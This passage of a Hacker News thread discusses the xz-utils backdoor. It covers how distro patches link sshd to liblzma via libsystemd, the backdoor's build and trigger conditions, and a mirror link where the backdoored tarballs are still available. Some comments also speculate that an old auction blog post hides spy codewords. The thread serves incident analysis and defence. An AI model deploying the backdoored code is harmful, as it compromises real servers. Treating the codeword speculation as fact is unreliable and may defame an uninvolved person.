example of a minimal setup? | | --- | --- | --- | | | |  |  | [SAI\_Peregrinus](user?id=SAI_Peregrinus) [9 months ago](item?id=39866704)   | [root](#39866076) | [parent](#39866366) | [prev](#39866494) | [next](#39867126) [–]  If they hadn't been modifying SSH their users would never have been hit by this backdoor. Of course if it is actually intended to target SSH on Debian systems, the attacker would likely have picked a different dependency. But adding dependencies like Debian did here means that those dependencies aren't getting reviewed by the original authors. For security-critical software like OpenSSH such unaudited dependencies are prime targets for attacks like this. | | --- | --- | --- | | | |  |  | [cassianoleal](user?id=cassianoleal) [9 months ago](item?id=39867256)   | [root](#39866076) | [parent](#39866704) | [next](#39866953) [–]  My point was, this is not "Debian did a thing". Lots of other distros do the same thing. In this particular case, it was in fact fortunate for users of all these other distros that Debian did it, lest this vulnerability might have never been found! Also, only users on sid (unstable) and maybe testing seem to have been affected. I doubt there are many Debian servers out there running sid. Debian stable (bookworm) has xz-utils version 5.4.1: <https://packages.debian.org/bookworm/xz-utils> | | --- | --- | --- | | | |  |  | [saalweachter](user?id=saalweachter) [9 months ago](item?id=39870365)   | [root](#39866076) | [parent](#39867256) | [next](#39867389) [–]  I would phrase it as "It's good we have a heterogenous open-source community". Monocrops are more vulnerable to disease because the same (biological) exploit works on the entire population. In our Linux biosphere where there are dozens of major, varied configurations sharing parts but not all of their code (and hundreds or thousands of minor variations), a given exploit is likely to fail *somewhere*, and that failure is likely to create a bug that someone can notice. It's not foolproof, but it helps keep the ecosystem healthy. | | --- | --- | --- | | | |  |  | [fullstop](user?id=fullstop) [9 months ago](item?id=39867389)   | [root](#39866076) | [parent](#39867256) | [prev](#39870365) | [next](#39866953) [–]  > Debian stable (bookworm) has xz-utils version 5.4.1: <https://packages.debian.org/bookworm/xz-utils> Guess who released 5.4.1? JiaT75! | | --- | --- | --- | | | |  |  | [cassianoleal](user?id=cassianoleal) [9 months ago](item?id=39868797)   | [root](#39866076) | [parent](#39867389) | [next](#39866953) [–]  5.4.1 doesn't even have the `m4/build-to-host.m4` script that pulls the backdoor's tarball. <https://salsa.debian.org/debian/xz-utils/-/tree/v5.4.1/m4> | | --- | --- | --- | | | |  |  | [fullstop](user?id=fullstop) [9 months ago](item?id=39868830)   | [root](#39866076) | [parent](#39868797) | [next](#39866953) [–]  Neither does <https://salsa.debian.org/debian/xz-utils/-/tree/v5.6.0/m4> The script was not present in the git tree, only in the released archives. I'm also suggesting that there could be more than one exploit present. All of their commits should be rolled back, none of it can be trusted. | | --- | --- | --- | | | |  |  | [cassianoleal](user?id=cassianoleal) [9 months ago](item?id=39869599)   | [root](#39866076) | [parent](#39868830) | [next](#39869206) [–]  > The script was not present in the git tree, only in the released archives. I confess I couldn't quite figure out the branching and tagging strategy on that repo. Very weird stuff. That script seems to have been added by Sebastian Andrzej Siewior just ahead of the 5.6.0 release. It's definitely present in the Debian git tree, and probably in many other distros since others seem to be affected. The commit where the script was added to Debian is tagged `upstream/v5.6.0` despite the script itself not being present on that tag upstream: <https://github.com/tukaani-project/xz/tree/v5.6.0/m4> > I'm also suggesting that there could be more than one exploit present. All of their commits should be rolled back, none of it can be trusted. I agree. | | --- | --- | --- | | | |  |  | [seba\_dos1](user?id=seba_dos1) [9 months ago](item?id=39870272)   | [root](#39866076) | [parent](#39869599) | [next](#39869206) [–]  > I confess I couldn't quite figure out the branching and tagging strategy on that repo. It's just a regular Debian packaging repository, which includes imports of upstream tarballs - nothing out of ordinary there. Debian packaging is based on tarballs, not on git repos (although in absence of upstream tarballs, Debian maintainer may create a tarball out of VCS repo themselves). The linked repo just happens to include some tags from upstream repo, but those tags are irrelevant to the packaging. Only "debian/\*" and "upstream/\*" tags are relevant. Upstream VCS history is only imported for the convenience of the packager, it doesn't have to be there. Debian's git repositories don't have any forced layout (they don't even have to exist or be up-to-date, the Debian Archive is the only source of truth - note how this repo doesn't contain the latest version of the package), but in practice most of them follow the conventions of DEP-14 implemented by gbp (in this particular case, it looks like `gbp import-orig --upstream-vcs-tag`: [https://wiki.debian.org/PackagingWithGit#Upstream\_import\_met...](https://wiki.debian.org/PackagingWithGit#Upstream_import_methods)). | | --- | --- | --- | | | |  |  | [cassianoleal](user?id=cassianoleal) [9 months ago](item?id=39874226)   | [root](#39866076) | [parent](#39870272) | [next](#39869206) [–]  Thanks for the explanation, very helpful! | | --- | --- | --- | | | |  |  | [sroussey](user?id=sroussey) [9 months ago](item?id=39869206)   | [root](#39866076) | [parent](#39868830) | [prev](#39869599) | [next](#39866953) [–]  Not just commits, but all tarballs released with his key. | | --- | --- | --- | | | |  |  | [sitkack](user?id=sitkack) [9 months ago](item?id=39866953)   | [root](#39866076) | [parent](#39866704) | [prev](#39867256) | [next](#39867126) [–]  It takes a village. | | --- | --- | --- | | | |  |  | [poettering](user?id=poettering) [9 months ago](item?id=39867126)   | [parent](#39866076) | [prev](#39866240) | [next](#39870396) [–]  Uh. systemd documents the protocol at various places and the protocol is trivial: a single text datagram sent to am AF\_UNIX socket whose path you get via the NOTIFY\_SOCKET. That's trivial to implement for any one with some basic unix programming knowledge. And i tell pretty much anyone who wants to listen that they should just implement the proto on their own if thats rhe only reason for a libsystemd dep otherwise. In particular non-C environments really should do their own native impl and not botjer wrapping libsystemd just for this. But let me stress two other things: Libselinux pulls in liblzma too and gets linked into *tons* more programs than libsystemd. And will end up in sshd too (at the very least via libpam/pam\_selinux). And most of the really big distros tend do support selinux at least to some level. Hence systemd or not, sshd remains vulnerable by this specific attack. With that in mind libsystemd git dropped the dep on liblzma actually, all compressors are now dlopen deps and thus only pulled in when needed. | | --- | --- | --- | | | |  |  | [agwa](user?id=agwa) [9 months ago](item?id=39867983)   | [root](#39866076) | [parent](#39867126) | [next](#39867664) [–]  > And i tell pretty much anyone who wants to listen that they should just implement the proto on their own if thats rhe only reason for a libsystemd dep otherwise Could you point out where the man page ([https://www.freedesktop.org/software/systemd/man/latest/sd\_n...](https://www.freedesktop.org/software/systemd/man/latest/sd_notify.html)) says this? | | --- | --- | --- | | | |  |  | [chadcatlett](user?id=chadcatlett) [9 months ago](item?id=39871121)   | [root](#39866076) | [parent](#39867983) | [next](#39871019) [–]  The notes section has a brief description of the protocol and the different kinds of sockets involved. | | --- | --- | --- | | | |  |  | [NekkoDroid](user?id=NekkoDroid) [9 months ago](item?id=39871019)   | [root](#39866076) | [parent](#39867983) | [prev](#39871121) | [next](#39867664) [–]  If you are talking about the stability of that interface: <https://systemd.io/PORTABILITY_AND_STABILITY/> | | --- | --- | --- | | | |  |  | [oklischat](user?id=oklischat) [9 months ago](item?id=39920437)   | [root](#39866076) | [parent](#39871019) | [next](#39867664) [–]  That site states "using libsystemd is a good choice" :-D | | --- | --- | --- | | | |  |  | [o11c](user?id=o11c) [9 months ago](item?id=39867664)   | [root](#39866076) | [parent](#39867126) | [prev](#39867983) | [next](#39867708) [–]  Deferring the load of the library often just makes things harder to analyze, not necessarily more secure. I imagine many of the comments quoting `ldd` are wrongly forgetting about `dlopen`. (I really wish there were a way to link such that the library isn't actually loaded but it still shows in the metadata, so you can get the performance benefits of doing less work but can still analyze the dependency DAG easily) | | --- | --- | --- | | | |  |  | [poettering](user?id=poettering) [9 months ago](item?id=39872711)   | [root](#39866076) | [parent](#39867664) | [next](#39867708) [–]  It would make things more secure in this specific backdooring case, since sshd only calls a single function of libsystemd (sd\_notify) and that one would not trigger the dlopen of liblzma, hence the specific path chosen by the backdoor would not work (unless libselinux fucks it up fter all, see other comments) Dlopen has drawbacks but also major benefits. We decided the benefits relatively clearly outweigh the drawbacks, but of course people may disagree. I have proposed a mechanism before, that would expose the list of libs we potentially load via dlopen into an ELF section or ELF note. This could be consumed by things such as packagae managers (for auto-dep generation) and ldd. However there was no interest in getting this landed from anyone else, so I dropped it. Note that there are various cases where people use dlopen not on hardcoded lib names, but dynamically configured ones, where this would not help. I.e. things like glibc nss or pam or anything else plugin based. But in particular pam kinda matters since that tends to be loaded into almost any kind of security relavant software, including sshd. | | --- | --- | --- | | | |  |  | [o11c](user?id=o11c) [9 months ago](item?id=39876286)   | [root](#39866076) | [parent](#39872711) | [next](#39902938) [–]  The plugin-based case can covered by the notion of multiple "entry points": every library that is intended to be `dlopen`ed is tagged with the name of the interface it provides, and every library that does such `dlopen`ing mentions the names of such interfaces rather than the names of libraries directly. Of course your `ldd` tool has to scan *all* the libraries on the system to know what might be loaded, but `ldconfig` already does that for libraries not in a private directory. This might sound like a lot of work for a package-manager-less-language ecosystem at first, but if you consider "tag" as "exports symbol with name", it is in fact already how most C plugin systems work (a few use an incompatible per-library computed name though, or rely entirely on global constructors). So really only the loading programs need to be modified, just like the fixed-name `dlopen`. | | --- | --- | --- | | | |  |  | [pabs3](user?id=pabs3) [9 months ago](item?id=39902938)   | [root](#39866076) | [parent](#39872711) | [prev](#39876286) | [next](#39867708) [–]  I note that Solaris had runtime-optional but compile-time linked shared libraries, I always wondered why Linux/glibc never adopted them. | | --- | --- | --- | | | |  |  | [iforgotpassword](user?id=iforgotpassword) [9 months ago](item?id=39867708)   | [root](#39866076) | [parent](#39867126) | [prev](#39867664) | [next](#39879990) [–]  > And i tell pretty much anyone who wants to listen that they should just implement the proto on their own if thats rhe only reason for a libsystemd dep otherwise. That's what I think too. Do the relevant docs point this out too? Ages ago they didn't. I think we should try to avoid that people just google "implement systemd notify daemon" and end up on a page that says "link to libsystemd and call sd\_notify()". | | --- | --- | --- | | | |  |  | [DPA2](user?id=DPA2) [9 months ago](item?id=39879990)   | [root](#39866076) | [parent](#39867126) | [prev](#39867708) | [next](#39915897) [–]  The correct thing to do would be to put different unrelated APIs into their own library, instead of everything into libsystemd0. This has always been one of my biggest issues with it. It makes it hard to replace just one API from that library, because on a binary distribution, only one package can provide it. And as a nice side effect, surprises like this one could then be avoided. | | --- | --- | --- | | | |  |  | [pabs3](user?id=pabs3) [9 months ago](item?id=39902944)   | [root](#39866076) | [parent](#39879990) | [next](#39915897) [–]  systemd developers have already rejected that approach, so I guess we will end up with lots of reimplementations, both in individual projects and third-party libsystemd-notify style libraries. | | --- | --- | --- | | | |  |  | [eijk](user?id=eijk) [9 months ago](item?id=39904494)   | [root](#39866076) | [parent](#39902944) | [next](#39915897) [–]  I see that different clients implemented in different languages will need different client-libraries and maintaining all that is not something, a core project is going to do but if using the raw protocol instead of the convenience of libsystemd is a (commonly ignored) recommendation which makes a lot of sense in terms of segmentation, providing at least one reference implementation would point all systemd users into the right direction. Recommending that each client should just implement the (trivial) protocol access itself does not make so much sense to me. | | --- | --- | --- | | | |  |  | [3v1n0](user?id=3v1n0) [9 months ago](item?id=39915897)   | [root](#39866076) | [parent](#39867126) | [prev](#39879990) | [next](#39878181) [–]  IIRC sshd loads libpam only if specifically configured for it. So while it's not wrong, it's also a more edge case for the backdoor to work. | | --- | --- | --- | | | |  |  | [bbarnett](user?id=bbarnett) [9 months ago](item?id=39878181)   | [root](#39866076) | [parent](#39867126) | [prev](#39915897) | [next](#39870396) [–]  *And will end up in sshd too (at the very least via libpam/pam\_selinux).* Inaccurate. It's not pulled in on any sysvinit Debian system I run. It is on stable, oldstable, and oldoldstable systems via systemd. Not systemd: # ldd $(which sshd) linux-vdso.so.1 (0x00007ffcb57f5000) ```         libcrypt.so.1 => /lib/x86_64-linux-gnu/libcrypt.so.1 (0x00007fbad13c9000)          libwrap.so.0 => /lib/x86_64-linux-gnu/libwrap.so.0 (0x00007fbad13bd000)          libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fbad138c000)          libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fbad137a000)          libsystemd.so.0 => /lib/x86_64-linux-gnu/libsystemd.so.0 (0x00007fbad12d5000)          libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007fbad12a5000)          libgssapi_krb5.so.2 => /lib/x86_64-linux-gnu/libgssapi_krb5.so.2 (0x00007fbad1253000)          libkrb5.so.3 => /lib/x86_64-linux-gnu/libkrb5.so.3 (0x00007fbad1179000)          libcom_err.so.2 => /lib/x86_64-linux-gnu/libcom_err.so.2 (0x00007fbad1173000)          libcrypto.so.3 => /lib/x86_64-linux-gnu/libcrypto.so.3 (0x00007fbad0c00000)          libz.so.1 => /lib/x86_64-linux-gnu/libz.so.1 (0x00007fbad1154000)          libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fbad0a1f000)          libnsl.so.2 => /lib/x86_64-linux-gnu/libnsl.so.2 (0x00007fbad1137000)          libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fbad112f000)          libcap.so.2 => /lib/x86_64-linux-gnu/libcap.so.2 (0x00007fbad1123000)          /lib64/ld-linux-x86-64.so.2 (0x00007fbad156a000)          libpcre2-8.so.0 => /lib/x86_64-linux-gnu/libpcre2-8.so.0 (0x00007fbad1089000)          libk5crypto.so.3 => /lib/x86_64-linux-gnu/libk5crypto.so.3 (0x00007fbad09f2000)          libkrb5support.so.0 => /lib/x86_64-linux-gnu/libkrb5support.so.0 (0x00007fbad09e4000)          libkeyutils.so.1 => /lib/x86_64-linux-gnu/libkeyutils.so.1 (0x00007fbad09dd000)          libresolv.so.2 => /lib/x86_64-linux-gnu/libresolv.so.2 (0x00007fbad09cc000)          libtirpc.so.3 => /lib/x86_64-linux-gnu/libtirpc.so.3 (0x00007fbad099e000)   ``` systemd: # ldd $(which sshd) linux-vdso.so.1 (0x00007ffc4d3eb000) ```         libcrypt.so.1 => /lib/x86_64-linux-gnu/libcrypt.so.1 (0x00007feb8aa35000)          libwrap.so.0 => /lib/x86_64-linux-gnu/libwrap.so.0 (0x00007feb8aa29000)          libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007feb8a9f8000)          libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007feb8a9e6000)          libsystemd.so.0 => /lib/x86_64-linux-gnu/libsystemd.so.0 (0x00007feb8a916000)          libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007feb8a8e6000)          libgssapi_krb5.so.2 => /lib/x86_64-linux-gnu/libgssapi_krb5.so.2 (0x00007feb8a894000)          libkrb5.so.3 => /lib/x86_64-linux-gnu/libkrb5.so.3 (0x00007feb8a7ba000)          libcom_err.so.2 => /lib/x86_64-linux-gnu/libcom_err.so.2 (0x00007feb8a7b4000)          libcrypto.so.3 => /lib/x86_64-linux-gnu/libcrypto.so.3 (0x00007feb8a200000)          libz.so.1 => /lib/x86_64-linux-gnu/libz.so.1 (0x00007feb8a795000)          libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007feb8a01f000)          libnsl.so.2 => /lib/x86_64-linux-gnu/libnsl.so.2 (0x00007feb8a778000)          libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007feb8a770000)          libcap.so.2 => /lib/x86_64-linux-gnu/libcap.so.2 (0x00007feb8a764000)          libgcrypt.so.20 => /lib/x86_64-linux-gnu/libgcrypt.so.20 (0x00007feb89ed8000)          liblzma.so.5 => /lib/x86_64-linux-gnu/liblzma.so.5 (0x00007feb8a735000)          libzstd.so.1 => /lib/x86_64-linux-gnu/libzstd.so.1 (0x00007feb89e1c000)          liblz4.so.1 => /lib/x86_64-linux-gnu/liblz4.so.1 (0x00007feb8a70d000)          /lib64/ld-linux-x86-64.so.2 (0x00007feb8abb5000)          libpcre2-8.so.0 => /lib/x86_64-linux-gnu/libpcre2-8.so.0 (0x00007feb89d82000)          libk5crypto.so.3 => /lib/x86_64-linux-gnu/libk5crypto.so.3 (0x00007feb8a6e0000)          libkrb5support.so.0 => /lib/x86_64-linux-gnu/libkrb5support.so.0 (0x00007feb8a6d2000)          libkeyutils.so.1 => /lib/x86_64-linux-gnu/libkeyutils.so.1 (0x00007feb8a6c9000)          libresolv.so.2 => /lib/x86_64-linux-gnu/libresolv.so.2 (0x00007feb8a6b8000)          libtirpc.so.3 => /lib/x86_64-linux-gnu/libtirpc.so.3 (0x00007feb8a68a000)          libgpg-error.so.0 => /lib/x86_64-linux-gnu/libgpg-error.so.0 (0x00007feb89d5a000)   ``` EG # ldd $(which sshd) | grep liblz ```         liblzma.so.5 => /lib/x86_64-linux-gnu/liblzma.so.5 (0x00007fd1e647a000)          liblz4.so.1 => /lib/x86_64-linux-gnu/liblz4.so.1 (0x00007fd1e6398000) ``` | | --- | --- | --- | | | |  |  | [3v1n0](user?id=3v1n0) [9 months ago](item?id=39915915)   | [root](#39866076) | [parent](#39878181) | [next](#39870396) [–]  You also need to have sshd enabled to use PAM and your sshd pam stack should include pam\_selinux. Then it will be dynamically loaded only when sshd starts a PAM session. | | --- | --- | --- | | | |  |  | [shirro](user?id=shirro) [9 months ago](item?id=39870396)   | [parent](#39866076) | [prev](#39867126) | [next](#39885528) [–]  The notify protocol isn't much more complicated than that. From memory you send a string to a unix socket. I have written both systemd notify and listenfd in a few languages for little experiments and it is hard to imagine how the protocols could be simpler. Looking at most popular projects these days they are a mass of dependencies and I think very few of them can be properly audited and verified by the projects that use them. Rust and Go might be more memory safe than C but look at the number of cargo or go modules in most projects. I have mostly stopped using node/npm on my systems. | | --- | --- | --- | | | |  |  | [esbranson](user?id=esbranson) [9 months ago](item?id=39885528)   | [parent](#39866076) | [prev](#39870396) | [next](#39869872) [–]  Not a programmer, but couldn't the distribution's sshd patches for systemd (and all other distro patches for privileged daemons) use static includes? Wouldn't that have only pulled in the simple client-side communication API? Would that have defeated this vector? Would it be doable? | | --- | --- | --- | | | |  |  | [hnald](user?id=hnald) [9 months ago](item?id=39869872)   | [parent](#39866076) | [prev](#39885528) | [next](#39867823) [–]  It's unfortunate that the anti-systemd party lost the war... years ago. But I don't blame systemd, Lennart Pottering or the fanboys (though it would have been so much better if the guy never worked in open source or wasn't such a prolific programmer). I blame Debian and its community for succumbing to this assault on Unix philosophy (again, years ago). | | --- | --- | --- | | | |  |  | [1attice](user?id=1attice) [9 months ago](item?id=39870903)   | [root](#39866076) | [parent](#39869872) | [next](#39867823) [–]  Sometimes things evolve in ways that make us feel a little obsolete. I've been learning NixOS for a few years now, and it would have been impossible without systemd. It's one heck of a learning curve, but when you get to the other side, you know something of great power and value. Certain kinds of complexity adds 'land' (eg. systemd) that can become 'real estate' (eg. NixOS), which in turn hopes to become 'land' for the next innovation, and so forth. Whether this happens or not (whether it's the *right* kind of complexity) is really hard to assess up-front, and probably impossible without knowing the complex new technology in question very well. (And by then you have the bias of depending, in part, yourself on the success of the new tech, as you've committed significant resources to mastering it, so good luck on convincing skeptical newcomers!) It's almost like a sort of event horizon -- once you know a complex new technology well enough to see whether or not it's useful, the conflict-of-interest makes your opinion unreliable to outsiders! Nevertheless, the assessment process itself, while difficult to get right, is worth getting better at. It's easy for impatience and the sensation of what I've taken to calling 'daunt' -- that intrinsic recoil that the mind has from absorbing a large amounts of information whose use case is not immediately relevant -- to dissuade one from exploring. But then, one never discovers new 'land', and one never builds new real estate! [ Aside: This is why I'm a little skeptical of the current rebellion against frontend frameworks. Certainly some of them, like tailwind, are clearly adding fetters to an otherwise powerful browser stack. But others, like Svelte, and to some extent, even React, bring significant benefits. The rebellion has this vibe like, well, users \_should\_ prefer more simply-built interfaces, and if they don't, well, they just have bad taste. What would be more humble would be to let the marketplace (e.g. consumers) decide what is preferable, and then build that. ] | | --- | --- | --- | | | |  |  | [mardifoufs](user?id=mardifoufs) [9 months ago](item?id=39867823)   | [parent](#39866076) | [prev](#39869872) | [next](#39871496) [–]  What? I don't get it? Isn't it on Debian if they modified the package to do something like this? Why would you blame systemd for maintainers doing something that upstream has never required or recommended? | | --- | --- | --- | | | |  |  | [korginator](user?id=korginator) [9 months ago](item?id=39871496)   | [prev](#39866076) | [next](#39869663) [–]  xz is so pervasive, I just discovered on my Mac that the (affected?) version 5.6.1 made it into homebrew. The post in the linked article says that only Linux x86-64 systems are affected, but now I'm left scratching my head whether my Mac is also in trouble, just that we don't know it yet. | | --- | --- | --- | | | |  |  | [jchoksi](user?id=jchoksi) [9 months ago](item?id=39869663)   | [prev](#39871496) | [next](#39869716) [–]  The two active maintainers seem to be: Lasse Collin <lasse.collin@tukaani.org> and Jia Tan <jiat0218@gmail.com> Searching DDG for "jiat0218" I came across a blog post which I found weird. Seems to be dated: 2006-05-03 Blog post: "Kuso拍賣．有靈氣的筷子 - 闕小豪" <<https://char.tw/blog/post/24397301>> Internet Archive link: <[https://web.archive.org/web/20240329182713/https://char.tw/b...](https://web.archive.org/web/20240329182713/https%3A//char.tw/blog/post/24397301)> The contents of the page when translated seems to be about jiat0218 auctioning a pair of spiritual chopsticks as a prank. The blog entry is basically a QA between jiat0218 and various other people about these chopsticks. If Jia Tan does turn out to be a compromised maintainer working for a state actor then some of the content on the blog page can be viewed in a more sinister way (i.e. spycraft / hacks for sale etc.). Example question 38: ```     Question 38     accounta066 (3): Are these chopsticks really that good? I kind of want to buy     them! But I recently sent money for online shopping but didn’t receive anything.     It’s very risky; currently jiat0218 you don’t have any reviews, you can     interview me. Do you want to hand it over?! … A sincere buyer will keep it.          Reply to     jiat0218 (4): First of all, I would like to express my condolences to you for     your unfortunate experience! What can I say about this kind of thing...My little     sister has always been trustworthy. What’s more, this is a pair of spiritual      chopsticks, so I hope to have a good one. It’s the beginning! As you can see,     my little sister is very careful and takes her time when answering your     questions. Except for the two messages that were accidentally deleted by her,     she always answers your questions. If this still doesn’t reassure you, then I     can only say that I still have room to work hard. You are still welcome     to bid... ^_^  ``` Note however, it could all just be what it purports to be which is a prank auction of spiritual chopsticks. | | --- | --- | --- | | | |  |  | [alwayslikethis](user?id=alwayslikethis) [9 months ago](item?id=39870428)   | [parent](#39869663) | [next](#39869682) [–]  This is likely just a coincidence. 0218 looks like a birthday and jiat is probably the name + initial. 18 years is also too long of a time horizon for this. | | --- | --- | --- | | | |  |  | [fragmede](user?id=fragmede) [9 months ago](item?id=39869682)   | [parent](#39869663) | [prev](#39870428) | [next](#39870685) [–]  Chopsticks could also be a codeword for something. Maybe some sort a backdoor into a system somewhere. | | --- | --- | --- | | | |  |  | [dimgl](user?id=dimgl) [9 months ago](item?id=39870685)   | [parent](#39869663) | [prev](#39869682) | [next](#39869716) [–]  Crazy to think that the time horizon for these kinds of attacks span decades. This absolutely does not read like a coincidence. Chopsticks, little sister, "room to work hard", all sound like codewords. | | --- | --- | --- | | | |  |  | [astrange](user?id=astrange) [9 months ago](item?id=39872899)   | [root](#39869663) | [parent](#39870685) | [next](#39873496) [–]  Do you say that about every word commonly used in Asia? | | --- | --- | --- | | | |  |  | [slowmotiony](user?id=slowmotiony) [9 months ago](item?id=39873496)   | [root](#39869663) | [parent](#39870685) | [prev](#39872899) | [next](#39869716) [–]  Sounds to me like google translate gibberish | | --- | --- | --- | | | |  |  | [dboreham](user?id=dboreham) [9 months ago](item?id=39869716)   | [prev](#39869663) | [next](#39866092) [–]  Something about this I found surprising is that Linux distros are pulling and packaging pre-built binaries from upstream projects. I'd have expected them to build from source. | | --- | --- | --- | | | |  |  | [richardwhiuk](user?id=richardwhiuk) [9 months ago](item?id=39869786)   | [parent](#39869716) | [next](#39870160) [–]  They were pulling a tarball from upstream and building it - the tarball was compromised. | | --- | --- | --- | | | |  |  | [Lockal](user?id=Lockal) [9 months ago](item?id=39873883)   | [root](#39869716) | [parent](#39869786) | [next](#39870160) [–]  The answer is not complete. There were 2 ways to pull sources: bad - <https://github.com/tukaani-project/xz/releases/download/>... or: good - <https://github.com/tukaani-project/xz/archive/refs/tags/>... Specifically in Gentoo, there is a note in [https://github.com/gentoo/gentoo/blob/master/app-arch/xz-uti...](https://github.com/gentoo/gentoo/blob/master/app-arch/xz-utils/xz-utils-9999.ebuild) ```   # Remember: we cannot leverage autotools in this ebuild in order   #           to avoid circular deps with autotools  ``` Namely, to unpack autoconf-2.72e.tar.xz from gnu.org you need xz-tools. And this is just the shortest circle. It is not very common, but xz-utils was one of few rare cases where regeneration of autohell files was considered as unnecessary complication (it backfired). | | --- | --- | --- | | | |  |  | [dpkirchner](user?id=dpkirchner) [9 months ago](item?id=39875312)   | [root](#39869716) | [parent](#39873883) | [next](#39904862) [–]  Unfortunately, those GitHub links are no longer valid, so we randos can't use them to learn what went wrong here. Hopefully GH will reverse this decision once the dust settles. | | --- | --- | --- | | | |  |  | [Lockal](user?id=Lockal) [9 months ago](item?id=39875976)   | [root](#39869716) | [parent](#39875312) | [next](#39875489) [–]  GitHub should not just reverse and make repo public and archived "as is", because there are many rolling distributions (from Gentoo to LFS), submodule pullers, CI systems, unaware users, which may pull and install the latest backdoored commit of archived project. However if you want to access exact copies of backdoored tarballs, they are still available on every mirror, e. g. in <http://gentoo.mirror.root.lu/distfiles/9f/> . For project of this level artifacts are checksummed and mirrored across the world by many people, and nothing wrong with that. | | --- | --- | --- | | | |  |  | [NekkoDroid](user?id=NekkoDroid) [9 months ago](item?id=39875489)   | [root](#39869716) | [parent](#39875312) | [prev](#39875976) | [next](#39904862) [–]  The gist of it is: The "good" one is the auto generated "Source code" releases made by github. The "bad" one is a manually generated and uploaded source code release, which can have whatever you want. | | --- | --- | --- | | | |  |  | [richardwhiuk](user?id=richardwhiuk) [9 months ago](item?id=39904862)   | [root](#39869716) | [parent](#39873883) | [prev](#39875312) | [next](#39870160) [–]  Sorry, by "they" I mean "Debian and Fedora", which (when including derivatives) include most Linux systems which use a Linux distro in the standard sense. | | --- | --- | --- | | | |  |  | [frankjr](user?id=frankjr) [9 months ago](item?id=39870160)   | [parent](#39869716) | [prev](#39869786) | [next](#39866092) [–]  Not in this case as the other commenter pointed out but for example Vivaldi on Arch Linux is just a repackaged upstream build. [https://gitlab.archlinux.org/archlinux/packaging/packages/vi...](https://gitlab.archlinux.org/archlinux/packaging/packages/vivaldi/-/blob/699db9d6ef67aee2806a716d877c53fa30dce1c4/PKGBUILD#L19) | | --- | --- | --- | | | |  |  | [0x0](user?id=0x0) [9 months ago](item?id=39866092)   | [prev](#39869716) | [next](#39872314) [–]  Homebrew is currently shipping 5.6.1 (and was shipping 5.6.0 as well). Hopefully not affected on mac? | | --- | --- | --- | | | |  |  | [woodruffw](user?id=woodruffw) [9 months ago](item?id=39866261)   | [parent](#39866092) | [next](#39866120) [–]  Homebrew reverted to 5.4.6 once the maintainers became aware. The current understanding is that macOS is not affected, but that's not certain. [1]: <https://github.com/Homebrew/homebrew-core/pull/167512> | | --- | --- | --- | | | |  |  | [stephenr](user?id=stephenr) [9 months ago](item?id=39866120)   | [parent](#39866092) | [prev](#39866261) | [next](#39872314) [–]  The issue is caused by patches to add integration with systemd, so no, this won't affect SSH on a Mac. | | --- | --- | --- | | | |  |  | [0x0](user?id=0x0) [9 months ago](item?id=39866208)   | [root](#39866092) | [parent](#39866120) | [next](#39872314) [–]  Just because macs don't use systemd, doesn't mean the backdoor won't work. The oss-sec post talks about liblzma having backdoors in crc32\_resolve() and crc64\_resolve() and that it has not been fully reversed. This could perhaps affect more than just sshd on x86-64 linux? | | --- | --- | --- | | | |  |  | [anarazel](user?id=anarazel) [9 months ago](item?id=39866569)   | [root](#39866092) | [parent](#39866208) | [next](#39866642) [–]  > Just because macs don't use systemd, doesn't mean the backdoor won't work. Practically speaking it can't - For one the script injected into the build process tests that you're running on x86-64 linux, for another, the injected code is elf code, which wouldn't link on a mac. It also needs to manipulate dynamic linker datastructures, which would also not work the same on a mac. > This could perhaps affect more than just sshd on x86-64 linux? This however is true - /usr/sbin/sshd was the only argv[0] value that I found to "work", but it's possible there are others. "/usr/sbin/sshd" isn't a string directly visible in the injected code, so it's hard to tell. | | --- | --- | --- | | | |  |  | [stephenr](user?id=stephenr) [9 months ago](item?id=39866642)   | [root](#39866092) | [parent](#39866208) | [prev](#39866569) | [next](#39872314) [–]  The article explains *numerous* concurrent conditions that have to be met for the backdoor to even be activated (at build time, not runtime), which combined make it extremely unlikely this will affect SSH on macOS: - linux - x86-64 - building with gcc & the GNU linker - part of a .deb or .rpm build Add to that, as the article explains: openssh does not directly use liblzma, the only reason SSH is affected at all, is because some Linux Distros patch openssh to link it against systemd, which *does* depend on liblzma. Could it affect things *other* than SSH on a Mac? Unlikely. The compromise was introduced in 5.6.0, but macOS Sonoma has 5.4.4 (from August last year). | | --- | --- | --- | | | |  |  | [CanaryLayout](user?id=CanaryLayout) [9 months ago](item?id=39872314)   | [prev](#39866092) | [next](#39868169) [–]  Well isn't this an interesting commit. He finished his inject macro to compose the payload at build, so now he can start clearing up the repo so none of that shit gets seen when cruising through it. [https://git.tukaani.org/?p=xz.git;a=commitdiff;h=4323bc3e0c1...](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=4323bc3e0c1e1d2037d5e670a3bf6633e8a3031e;hp=5394a1665b7a108a54cb8b4ef3ebe59d3dbcca3a) | | --- | --- | --- | | | |  |  | [astrange](user?id=astrange) [9 months ago](item?id=39872853)   | [parent](#39872314) | [next](#39868169) [–]  That's not what gitignore does. I can't think of a way it would let you hide this exploit. | | --- | --- | --- | | | |  |  | [zamalek](user?id=zamalek) [9 months ago](item?id=39873991)   | [root](#39872314) | [parent](#39872853) | [next](#39868169) [–]  Accidentally committing it. | | --- | --- | --- | | | |  |  | [astrange](user?id=astrange) [9 months ago](item?id=39881339)   | [root](#39872314) | [parent](#39873991) | [next](#39868169) [–]  Makes it a bit harder for sure. What actually happens if you git add something that's ignored? I assumed it would still let you do it, but never tried. | | --- | --- | --- | | | |  |  | [c\_rrodriguez](user?id=c_rrodriguez) [9 months ago](item?id=39868169)   | [prev](#39872314) | [next](#39868821) [–]  Everybody here In jumping into the pure malice bandwagon, I have a better hypothesis. Abandonment and inaction, the actual developers of these tools are elsewhere, oblivious to this drama, trying to make living because most of the time you are not compensated nor any corporation cares about making things sustainable at all. This is the default status of everything your fancy cloud depends on 